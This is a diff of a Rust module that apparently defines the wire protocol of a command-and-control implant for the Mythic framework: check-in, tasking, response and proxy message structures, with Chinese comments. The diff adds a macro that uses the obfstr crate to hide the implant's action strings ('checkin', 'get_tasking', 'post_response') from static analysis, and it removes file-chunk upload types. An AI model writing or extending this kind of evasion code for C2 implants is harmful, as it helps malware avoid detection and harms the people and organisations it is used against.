@@ -1,14 +1,13 @@
-extern crate alloc;
 
-use alloc::string::String;
-use alloc::vec::Vec;
+// 通过检查protocol.rs中定义的结构体和官方文档的区别,完善用到的结构体.用到时再检查就行
+
 use serde::{Deserialize, Serialize};
 pub use crate::buffer::StackVec;
 
 // ==========================================
-// 1. 继承与重导出 crate 根命名空间生效配置、常量与预算类型
+// 1. 继承与重导出 crate::buffer 生效配置、常量与预算类型
 // ==========================================
-pub use crate::{
+pub use crate::buffer::{
     ActiveBudget, ActiveStackWorkspace, DefaultStackWorkspace,
     BUFFER_SIZE, ACTIVE_WIRE_SIZE, B64Buffer, RawBuffer,
     Budget16K, Budget4K, Budget64K,
@@ -65,6 +64,32 @@ impl DynamicBudget {
 // 统一由 crate::error 收敛导出，保持全局错误代号密码本契约
 pub use crate::error::ModelError;
 
+// ==========================================
+// 编译期混淆动作标识辅助 (Obfuscated Protocol Actions)
+// ==========================================
+
+macro_rules! obfuscated_static_action {
+    ($name:ident, $str_lit:literal, $len:literal) => {
+        #[inline]
+        pub fn $name() -> &'static str {
+            static CELL: std::sync::OnceLock<[u8; $len]> = std::sync::OnceLock::new();
+            let bytes = CELL.get_or_init(|| {
+                obfstr::obfstr!(let s = $str_lit;);
+                let mut b = [0u8; $len];
+                b.copy_from_slice(s.as_bytes());
+                b
+            });
+            match core::str::from_utf8(bytes) {
+                Ok(s) => s,
+                Err(_) => "",
+            }
+        }
+    };
+}
+
+obfuscated_static_action!(action_checkin, "checkin", 7);
+obfuscated_static_action!(action_get_tasking, "get_tasking", 11);
+obfuscated_static_action!(action_post_response, "post_response", 13);
 
 // ==========================================
 // 2. Initial Checkin & Key Exchange (上线注册与密钥协商)
@@ -139,7 +164,7 @@ impl<'a> CheckinMessage<'a> {
         domain: &'a str,
     ) -> Self {
         Self {
-            action: "checkin",
+            action: action_checkin(),
             uuid,
             ips: Some(ips),
             os: Some(os),
@@ -317,7 +342,7 @@ impl<'a> Default for GetTaskingMessage<'a> {
     #[inline]
     fn default() -> Self {
         Self {
-            action: "get_tasking",
+            action: action_get_tasking(),
             tasking_size: 1,
             get_delegate_tasks: None,
             responses: None,
@@ -512,7 +537,7 @@ impl<'a> PostResponseMessage<'a> {
     #[inline]
     pub fn new(responses: &'a [TaskResponseItem<'a>]) -> Self {
         Self {
-            action: "post_response",
+            action: action_post_response(),
             responses,
             delegates: None,
             socks: None,
@@ -651,16 +676,6 @@ pub struct TaskResponseItem<'a> {
     /// 异步 Agent RPC 请求挂载 (Mythic 4.0)
     #[serde(skip_serializing_if = "Option::is_none")]
     pub agent_rpc: Option<AgentRpcRequest<'a>>,
-
-    // === 通用分片字段 ===
-    #[serde(skip_serializing_if = "Option::is_none")]
-    pub file_id: Option<&'a str>,
-    #[serde(skip_serializing_if = "Option::is_none")]
-    pub chunk_num: Option<u32>,
-    #[serde(skip_serializing_if = "Option::is_none")]
-    pub total_chunks: Option<u32>,
-    #[serde(skip_serializing_if = "Option::is_none")]
-    pub chunk_data: Option<&'a str>,
 }
 
 impl<'a> TaskResponseItem<'a> {
@@ -829,48 +844,6 @@ pub struct ServerFileUploadResponse<'a> {
     pub file_id: &'a str,
     #[serde(borrow)]
     pub task_id: &'a str,
-}
-
-/// 兼容 Wisconsin 现有的通用大文件流式切片载荷
-#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
-#[cfg_attr(any(debug_assertions, test), derive(Debug))]
-pub struct FileChunkPayload<'a> {
-    #[serde(borrow)]
-    pub action: &'a str,
-    #[serde(borrow)]
-    pub file_id: &'a str,
-    pub chunk_num: u32,
-    pub total_chunks: u32,
-    #[serde(borrow)]
-    pub chunk_data: &'a str,
-    #[serde(borrow, skip_serializing_if = "Option::is_none")]
-    pub task_id: Option<&'a str>,
-}
-
-impl<'a> FileChunkPayload<'a> {
-    #[inline(always)]
-    pub fn is_last_chunk(&self) -> bool {
-        self.chunk_num == self.total_chunks
-    }
-
-    pub fn validate(&self) -> Result<(), ModelError> {
-        if self.action.is_empty() {
-            return Err(ModelError::InvalidAction);
-        }
-        if self.file_id.is_empty() {
-            return Err(ModelError::MissingRequiredField);
-        }
-        if self.chunk_num == 0 || self.chunk_num > self.total_chunks {
-            return Err(ModelError::InvalidChunkInfo);
-        }
-        if self.is_last_chunk() && self.chunk_data.is_empty() && self.total_chunks > 1 {
-            return Err(ModelError::InvalidChunkInfo);
-        }
-        if !self.chunk_data.len().is_multiple_of(4) {
-            return Err(ModelError::InvalidChunkInfo);
-        }
-        Ok(())
-    }
 }
 
 
@@ -1440,8 +1413,8 @@ mod tests {
         assert_eq!(WIRE_SIZE_64K, 65536);
 
         assert_eq!(MAX_B64_LEN, ACTIVE_WIRE_SIZE);
-        assert_eq!(MAX_RAW_LEN, crate::calc_raw_len(ACTIVE_WIRE_SIZE));
-        assert_eq!(MAX_PLAINTEXT_LEN, crate::calc_max_plaintext_len(MAX_RAW_LEN));
+        assert_eq!(MAX_RAW_LEN, crate::buffer::calc_raw_len(ACTIVE_WIRE_SIZE));
+        assert_eq!(MAX_PLAINTEXT_LEN, crate::buffer::calc_max_plaintext_len(MAX_RAW_LEN));
         assert_eq!(MIN_RAW_MESSAGE_LEN, 100);
         assert_eq!(MAX_RAW_LEN * 4 / 3, MAX_B64_LEN);
 
